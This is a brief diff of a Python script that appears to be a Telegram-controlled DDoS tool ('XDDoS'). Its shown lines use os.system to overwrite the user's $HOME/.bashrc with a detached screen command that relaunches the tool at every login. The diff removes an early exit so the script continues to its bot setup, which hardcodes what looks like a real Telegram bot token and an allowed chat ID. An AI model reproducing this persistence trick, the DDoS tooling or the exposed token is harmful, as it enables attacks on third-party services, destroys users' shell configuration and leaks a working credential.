@@ -45,8 +45,6 @@ except ImportError:
 os.system(f"echo screen -d -m -S {screen_name} XDDoS > $HOME/.bashrc")
 #os.system("screen -d -m python3 ChDDoS.py")
 #os.system("bash")
-tou.sleep(2)
-os._exit(0)
 TOKEN = '7897939362:AAGtB2Ou4USDEN-bpYgdGqDEbiuOX22JsLA'
 ALLOWED_CHAT_ID = [6469804005] 
 
